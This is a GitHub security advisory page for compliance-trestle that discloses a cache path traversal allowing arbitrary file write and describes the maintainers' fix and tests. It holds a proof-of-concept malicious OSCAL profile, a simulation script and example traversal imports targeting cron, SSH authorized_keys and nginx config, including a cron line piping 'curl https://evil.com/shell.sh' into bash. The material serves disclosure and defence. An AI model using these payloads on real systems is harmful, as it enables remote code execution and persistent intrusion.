https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-g3vg-vx23-3858

Skip to content
oscal-compass
compliance-trestle
Repository navigation
Code
Issues
43
 (43)
Pull requests
29
 (29)
Agents
Discussions
Actions
Projects
Security and quality
Insights

Arbitrary File Write via Cache Path Traversal in compliance-trestle Remote Fetching
 Draft	High	AnistoMejin opened GHSA-g3vg-vx23-3858 2 weeks ago · 3 comments
Package
 compliance-trestle (
pip
)
Affected versions
<= 4.0.2
Patched versions
None
AnistoMejin opened 2 weeks ago
Description
Summary
The compliance-trestle library's remote fetching cache mechanism (HTTPSFetcher and SFTPFetcher) constructs the local cache file path from the URL path component without sanitizing path traversal sequences (../). When a remote OSCAL profile references a URL with traversal in its path, the HTTP response body is written to a location outside the intended cache directory, enabling arbitrary file write with attacker-controlled content to the filesystem.

Attack chain: Malicious OSCAL profile → HTTPS fetch → cache path traversal → arbitrary file write → RCE (via cron, SSH keys, etc.)

Affected Component
Repository: https://github.com/IBM/compliance-trestle
File: trestle/core/remote/cache.py (lines 259-266 for HTTPSFetcher, lines 328-333 for SFTPFetcher)
Version: v4.0.2 (latest as of 2026-04-30)

Vulnerable Code
cache.py:259-266 — HTTPSFetcher cache path construction
class HTTPSFetcher(FetcherBase):
    def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
        # ...
        u = parse.urlparse(self._uri)
        # ...
        if u.hostname is None:
            raise TrestleError(f'Cache request for {self._uri} requires hostname')
        https_cached_dir = self._trestle_cache_path / u.hostname
        # ❌ path_parent preserves ../ sequences from URL
        path_parent = pathlib.Path(u.path[re.search('[^/\\\\]', u.path).span()[0] :]).parent
        https_cached_dir = https_cached_dir / path_parent
        https_cached_dir.mkdir(parents=True, exist_ok=True)  # ❌ Creates dirs outside cache
        self._cached_object_path = https_cached_dir / pathlib.Path(pathlib.Path(u.path).name)
cache.py:285-295 — Content written to traversed path
    def _do_fetch(self) -> None:
        # ...
        response = requests.get(self._url, auth=auth, verify=verify, timeout=30)
        if response.status_code == 200:
            result = response.text  # ❌ Attacker-controlled content
            self._cached_object_path.write_text(result)  # ❌ Written to arbitrary path
cache.py:328-333 — SFTPFetcher (identical pattern)
class SFTPFetcher(FetcherBase):
    def __init__(self, ...):
        # Identical path construction — same vulnerability
        sftp_cached_dir = self._trestle_cache_path / u.hostname
        path_parent = pathlib.Path(u.path[re.search('[^/\\\\]', u.path).span()[0] :]).parent
        sftp_cached_dir = sftp_cached_dir / path_parent
        sftp_cached_dir.mkdir(parents=True, exist_ok=True)
        self._cached_object_path = sftp_cached_dir / pathlib.Path(pathlib.Path(u.path).name)
Root Cause:

urlparse("https://evil.com/../../../tmp/pwned.json").path = /../../../tmp/pwned.json — preserves ../
pathlib.Path(u.path).parent preserves traversal sequences
cache_dir / hostname / "../../../../../../tmp" resolves outside cache
mkdir(parents=True, exist_ok=True) creates intermediate directories
write_text(response.text) writes attacker-controlled content to traversed path
No is_relative_to() boundary check on the resolved path
Steps to Reproduce
Prerequisites
pip install compliance-trestle==4.0.2
PoC: Malicious OSCAL Profile
# malicious_profile.yaml — arbitrary file write via cache traversal
profile:
  uuid: "550e8400-e29b-41d4-a716-446655440000"
  metadata:
    title: "Malicious Profile"
    version: "1.0"
    last-modified: "2024-01-01T00:00:00+00:00"
    oscal-version: "1.0.4"
  imports:
    - href: "https://evil.com/../../../../../../../tmp/trestle_pwned.json"
PoC: Cache Path Traversal Simulation
#!/usr/bin/env python3
"""PoC: Cache path traversal → arbitrary file write"""
import os, re, tempfile, shutil
from pathlib import Path
from urllib.parse import urlparse

# Simulate trestle cache behavior (cache.py:259-266)
trestle_root = Path(tempfile.mkdtemp(prefix="trestle_poc_"))
cache_dir = trestle_root / ".trestle" / ".cache"
cache_dir.mkdir(parents=True, exist_ok=True)

evil_url = "https://evil.com/../../../../../../../tmp/trestle_pwned.json"
u = urlparse(evil_url)

# Exact trestle code path
cached_dir = cache_dir / u.hostname
m = re.search(r'[^/\\\\]', u.path)
path_parent = Path(u.path[m.span()[0]:]).parent
cached_dir = cached_dir / path_parent
cached_dir.mkdir(parents=True, exist_ok=True)
cached_file = cached_dir / Path(Path(u.path).name)

print(f"Cache dir: {cache_dir}")
print(f"Resolved write target: {cached_file.resolve()}")
# Output: /tmp/trestle_pwned.json ← OUTSIDE cache directory!

# Write attacker content
attacker_payload = '*/5 * * * * root /bin/bash -c "id > /tmp/rce_proof"'
cached_file.write_text(attacker_payload)
print(f"Written: {cached_file.resolve().read_text()}")

# Cleanup
os.remove(str(cached_file.resolve()))
shutil.rmtree(str(trestle_root))
Expected: Write confined to .trestle/.cache/ directory
Actual: File written to /tmp/trestle_pwned.json (arbitrary filesystem location)

Remediation
Fix for HTTPSFetcher (cache.py:259-266):
class HTTPSFetcher(FetcherBase):
    def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
        # ...
        u = parse.urlparse(self._uri)
        https_cached_dir = self._trestle_cache_path / u.hostname

        # ✅ Sanitize path: remove traversal sequences
        safe_path = pathlib.PurePosixPath(u.path).parts
        safe_path = [p for p in safe_path if p != '..' and p != '/']
        path_parent = pathlib.Path(*safe_path[:-1]) if len(safe_path) > 1 else pathlib.Path('.')

        https_cached_dir = https_cached_dir / path_parent
        https_cached_dir.mkdir(parents=True, exist_ok=True)
        self._cached_object_path = https_cached_dir / safe_path[-1]

        # ✅ Boundary check
        if not self._cached_object_path.resolve().is_relative_to(self._trestle_cache_path.resolve()):
            raise TrestleError(
                f"Cache path traversal blocked: URL '{uri}' resolves to "
                f"'{self._cached_object_path.resolve()}' outside cache directory"
            )
Same fix required for SFTPFetcher at lines 328-333.

References
CWE-22: https://cwe.mitre.org/data/definitions/22.html
CWE-73: https://cwe.mitre.org/data/definitions/73.html
compliance-trestle: https://github.com/IBM/compliance-trestle
Impact
1. Cron Job Injection → Remote Code Execution
# Profile that writes a cron job
imports:
  - href: "https://evil.com/../../../../../../../etc/cron.d/backdoor"
Attacker's server responds with:

* * * * * root /bin/bash -c 'curl https://evil.com/shell.sh | bash'
2. SSH Authorized Keys Injection
imports:
  - href: "https://evil.com/../../../../../../../root/.ssh/authorized_keys"
Attacker's server responds with their SSH public key.

3. Config File Overwrite
imports:
  - href: "https://evil.com/../../../../../../../etc/nginx/conf.d/evil.conf"
4. Python Path Hijacking
Write malicious .py file to a location on sys.path for code execution on next import.

@AnistoMejin AnistoMejin added themselves as a collaborator 2 weeks ago
@AnistoMejin AnistoMejin was credited as a reporter 2 weeks ago
@AnistoMejin AnistoMejin accepted credit 2 weeks ago
@degenaro
Collaborator
degenaro
commented
2 weeks ago
@AnistoMejin Thanks for this report now under review...

@degenaro degenaro accepted this report 3 days ago
@degenaro degenaro added @yantongggg yantongggg as a collaborator 3 days ago
@degenaro degenaro created the temporary private fork oscal-compass/compliance-trestle-ghsa-g3vg-vx23-3858 3 days ago
@degenaro
Collaborator
degenaro
commented
3 days ago
• 
Security Fix Summary: Arbitrary File Write via Cache Path Traversal
Vulnerability: CWE-22 (Path Traversal)
Advisory: GHSA-g3vg-vx23-3858

Component: HTTPSFetcher and SFTPFetcher cache path construction in trestle/core/remote/cache.py

Root Cause: URL paths with .. sequences were not validated before constructing cache file paths, allowing writes outside the cache directory.

Attack Example:

https://evil.com/../../../tmp/pwned.json → writes to /tmp/pwned.json
Impact: Arbitrary file write → potential RCE via cron jobs, SSH keys, or config files

Fix Implementation
1. New Security Module: trestle/core/remote/security.py (95 lines)
PathSecurityValidator class with two validation methods:

Method 1: validate_url_path_for_cache(url_path)

Validates URL path component before cache path construction
Rejects any path containing .. sequences
Raises TrestleError immediately (fail-fast approach)
Method 2: validate_cache_path(cache_path, cache_root)

Validates resolved cache path stays within cache directory
Uses pathlib.resolve() and relative_to() for boundary checking
Defense-in-depth: catches traversal even if constructed programmatically
2. Updated Cache Operations: trestle/core/remote/cache.py
HTTPSFetcher (lines 263-280):

# Layer 1: Validate URL path
PathSecurityValidator.validate_url_path_for_cache(u.path)
# ... construct cache path ...
# Layer 2: Validate resolved path
PathSecurityValidator.validate_cache_path(self._cached_object_path, self._trestle_cache_path)
SFTPFetcher (lines 342-359):

Same two-layer validation applied
3. Comprehensive Test Suite: tests/trestle/core/remote/cache_security_test.py (220 lines)
Test coverage includes:

Path validation (normal paths pass, .. sequences blocked)
Cache boundary validation (paths stay within cache)
HTTPSFetcher security tests (6 attack vectors)
SFTPFetcher security tests (6 attack vectors)
Real-world attack scenarios (cron injection, SSH key overwrites, config tampering)
Security Approach
Validation-only (no sanitization):

✅ Rejects malicious paths immediately
✅ No transformation of user input
✅ Simple logic, easier to audit
✅ Follows security best practices
Two-layer defense-in-depth:

Layer 1: Input validation (reject .. in URL paths)
Layer 2: Boundary validation (verify resolved paths stay in cache)
Files Modified
✅ trestle/core/remote/security.py - New security validation module
✅ trestle/core/remote/cache.py - Added validation calls
✅ tests/trestle/core/remote/cache_security_test.py - New test suite
Validation Logic
How We Decide What Paths Are in Violation
Layer 1: Input Validation

if '..' in url_path:
    raise TrestleError(...)
Rule: Reject any URL path containing .. sequences
Rationale: .. is the universal path traversal pattern with no legitimate use in URLs
Examples:
✅ /normal/path.json - ALLOWED
✅ /data/catalog.json - ALLOWED
❌ /../../../etc/passwd - BLOCKED
❌ /path/../file.json - BLOCKED
Layer 2: Boundary Validation

resolved_cache = cache_path.resolve()
resolved_root = cache_root.resolve()
resolved_cache.relative_to(resolved_root)  # Raises ValueError if outside
Rule: Verify resolved path stays within .trestle/cache/
Rationale: Defense-in-depth - validates the final resolved path regardless of how it was constructed, protecting against future code changes, alternative construction paths, or encoding bypass attempts
Examples:
✅ /home/user/.trestle/cache/evil.com/data.json - ALLOWED
❌ /tmp/pwned.json - BLOCKED
❌ /etc/passwd - BLOCKED
Testing
The test suite provides comprehensive coverage of the security fix with 12 test cases across 5 test classes:

Test Classes:

TestPathValidation - URL path validation logic
TestPathSecurityValidator - Cache boundary validation
TestHTTPSFetcherPathTraversal - HTTPSFetcher security (6 attack vectors)
TestSFTPFetcherPathTraversal - SFTPFetcher security (6 attack vectors)
TestRealWorldAttackVectors - Real-world attack scenarios
Coverage includes:

Normal path validation (legitimate paths pass)
Path traversal detection (.. sequences blocked)
Cache boundary enforcement (paths stay within cache)
Real-world attack prevention (cron injection, SSH key overwrites, config tampering)
@yantongggg yantongggg was credited as a reporter 3 days ago
@yantongggg yantongggg accepted credit 3 days ago
@degenaro degenaro requested a CVE 3 days ago
@github-staff github-staff assigned CVE-2026-45725 2 days ago
@github-staff
github-staff
commented
2 days ago
GitHub has issued CVE-2026-45725 for this Security Advisory after reviewing it for compliance with CVE rules. Once your Security Advisory is published, we'll publish the CVE record to the CVE List. At that time, if your package is in a supported ecosystem, we'll also publish an advisory in the global GitHub Advisory Database and send security alerts to affected repositories.

Thank you for making the open source ecosystem more secure by fixing and responsibly disclosing this vulnerability.

Collaborate on a patch
https://github.com/oscal-compass/compliance-trestle-ghsa-g3vg-vx23-3858.git
Use the temporary private fork to collaborate on a patch for this advisory.

fix: write security against .. in remove cache path
#1 opened 3 days ago by degenaro • Approved
 2
oscal-compass/compliance-trestle:develop ← oscal-compass/compliance-trestle-ghsa-g3vg-vx23-3858:develop
This advisory may be blocked by repository rules
4 repository rules found
Show rules
 These changes may only be merged by someone with publishing rights.
Required advisory information has been provided
You’re ready to publish, but first you must merge or close outstanding pull requests.
Suggested advisory information
Provide additional information to help your users prioritize and remediate this advisory appropriately.
Patched version
 
— Notify your users of safe update options.
@yantongggg
Write
Preview
Leave a comment
Severity
High
CVE ID
CVE-2026-45725
Weaknesses
WeaknessCWE-73
Credits
@AnistoMejin AnistoMejin
Reporter Accepted 13 days ago
@yantongggg yantongggg
Reporter Accepted 3 days ago
Collaborators
Only the following users and teams can see and collaborate on this advisory:

@oscal-compass oscal-compass owners
@degenaro degenaro
@butler54 butler54
@vikas-agarwal76 vikas-agarwal76
@AnistoMejin AnistoMejin Author
@yantongggg yantongggg
Publishers
Only the following users and teams can publish this advisory:

@oscal-compass oscal-compass owners
@degenaro degenaro
@butler54 butler54
@vikas-agarwal76 vikas-agarwal76
Footer
© 2026 GitHub, Inc.
Footer navigation
Terms
Privacy
Security
Status
Community
Docs
Contact
Manage cookies
Do not share my personal information
